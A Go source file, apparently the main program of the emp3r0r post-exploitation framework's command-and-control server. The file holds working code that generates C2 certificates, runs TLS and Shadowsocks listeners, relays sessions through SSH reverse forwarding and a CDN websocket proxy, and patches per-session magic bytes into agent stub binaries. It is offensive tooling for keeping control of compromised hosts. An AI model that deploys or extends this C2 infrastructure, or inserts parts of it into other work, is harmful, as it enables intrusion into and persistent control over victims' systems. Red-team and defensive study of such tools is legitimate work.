//go:build linux
// +build linux

package main

import (
	"context"
	"flag"
	"fmt"
	"os"
	"strings"

	"github.com/jm33-m0/emp3r0r/core/lib/cc"
	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	cdn2proxy "github.com/jm33-m0/go-cdn2proxy"
)

func readJSONConfig(filename string) (err error) {
	// read JSON
	jsonData, err := os.ReadFile(filename)
	if err != nil {
		return
	}

	return emp3r0r_data.ReadJSONConfig(jsonData, cc.RuntimeConfig)
}

// re-generate a random magic string for this CC session
func init_magic_str() {
	default_magic_str := emp3r0r_data.OneTimeMagicBytes
	emp3r0r_data.OneTimeMagicBytes = util.RandBytes(len(default_magic_str))

	// update binaries
	files, err := os.ReadDir(cc.EmpWorkSpace)
	if err != nil {
		cc.CliFatalError("init_magic_str: %v", err)
	}
	for _, f := range files {
		if f.IsDir() {
			continue
		}
		if strings.HasPrefix(f.Name(), "stub-") {
			err = util.ReplaceBytesInFile(fmt.Sprintf("%s/%s", cc.EmpWorkSpace, f.Name()),
				default_magic_str, emp3r0r_data.OneTimeMagicBytes)
			if err != nil {
				cc.CliPrintError("init_magic_str %v", err)
			}
		}
	}
}

func main() {
	// set up dirs and default varaibles
	// including config file location
	err := cc.InitConfig()
	if err != nil {
		cc.CliFatalError("DirSetup: %v", err)
	}

	cdnproxy := flag.String("cdn2proxy", "", "Start cdn2proxy server on this port")
	config := flag.String("config", cc.EmpConfigFile, "Use this config file to update hardcoded variables")
	names := flag.String("gencert", "", "Generate C2 server cert with these host names")
	apiserver := flag.Bool("api", false, "Run API server in background, you can send commands to /tmp/emp3r0r.socket")
	ssh_relay_port := flag.String("relay_server", "", "Act as SSH remote forwarding relay on this port")
	connect_relay_addr := flag.String("connect_relay", "", "Connect to SSH remote forwarding relay (host:port)")
	relayed_port := flag.Int("relayed_port", 0, "Relayed port, use with -connect_relay")
	flag.Parse()

	// generate C2 TLS cert for given host names
	if *names != "" {
		hosts := strings.Fields(*names)
		err := cc.GenC2Certs(hosts)
		if err != nil {
			cc.CliFatalError("GenC2Certs: %v", err)
		}
		err = cc.InitConfigFile(hosts[0])
		if err != nil {
			cc.CliFatalError("Init %s: %v", cc.EmpConfigFile, err)
		}
		os.Exit(0)
	}

	// read config file
	err = readJSONConfig(*config)
	if err != nil {
		cc.CliFatalError("Failed to read config from '%s': %v", *config, err)
	}

	// set up magic string
	init_magic_str()

	// abort if CC is already running
	if cc.IsCCRunning() {
		cc.CliFatalError("CC is already running")
	}

	// run as relay server
	// no need to start CC services
	if *ssh_relay_port != "" {
		cc.CliMsg("Copy ~/.emp3r0r to client host, "+
			"then run `emp3r0r -connect_relay relay_ip:%s -relayed_port %s` "+
			"(C2 port, or Shadowsocks port %s if you are using it)",
			*ssh_relay_port, cc.RuntimeConfig.CCPort, cc.RuntimeConfig.ShadowsocksPort)
		err = tun.SSHRemoteFwdServer(*ssh_relay_port,
			cc.RuntimeConfig.Password,
			cc.RuntimeConfig.SSHHostKey)
		if err != nil {
			cc.CliFatalError("SSHRemoteFwdServer: %v", err)
		}
	} else {
		// run as CC
		go cc.TLSServer()
		go cc.ShadowsocksServer()
		go cc.InitModules()
	}

	// run as relay client
	if *connect_relay_addr != "" {
		if *relayed_port == 0 {
			cc.CliFatalError("Please specify -relayed_port")
		}
		go func() {
			defer cc.CliPrintError("session unexpectedly exited, please restart emp3r0r")
			var SSHConnections = make(map[string]context.CancelFunc, 10)
			pubkey, err := tun.SSHPublicKey(cc.RuntimeConfig.SSHHostKey)
			if err != nil {
				cc.CliFatalError("Parsing SSHPublicKey: %v", err)
			}
		ssh_connect:
			ctx, cancel := context.WithCancel(context.Background())
			err = tun.SSHRemoteFwdClient(*connect_relay_addr,
				cc.RuntimeConfig.Password,
				pubkey, // enable host key verification
				*relayed_port,
				&SSHConnections, ctx, cancel)
			if err == nil {
				err = fmt.Errorf("session unexpectedly exited")
			}
			cc.CliPrintWarning("SSHRemoteFwdClient: %v, retrying", err)
			util.TakeABlink()
			goto ssh_connect
		}()
	}

	// start cdn2proxy server
	if *cdnproxy != "" {
		go func() {
			logFile, err := os.OpenFile("/tmp/ws.log", os.O_CREATE|os.O_RDWR, 0600)
			if err != nil {
				cc.CliFatalError("OpenFile: %v", err)
			}
			err = cdn2proxy.StartServer(*cdnproxy, "127.0.0.1:"+cc.RuntimeConfig.CCPort, "ws", logFile)
			if err != nil {
				cc.CliFatalError("CDN StartServer: %v", err)
			}
		}()
	}

	// print banner
	err = cc.CliBanner()
	if err != nil {
		cc.CliFatalError("Banner: %v", err)
	}

	// unlock incomplete downloads
	err = cc.UnlockDownloads()
	if err != nil {
		cc.CliPrintWarning("UnlockDownloads: %v", err)
	}

	// use emp3r0r in terminal or from other frontend
	if *apiserver {
		go cc.APIMain()
	}

	// run CLI
	cc.CliMain()
}
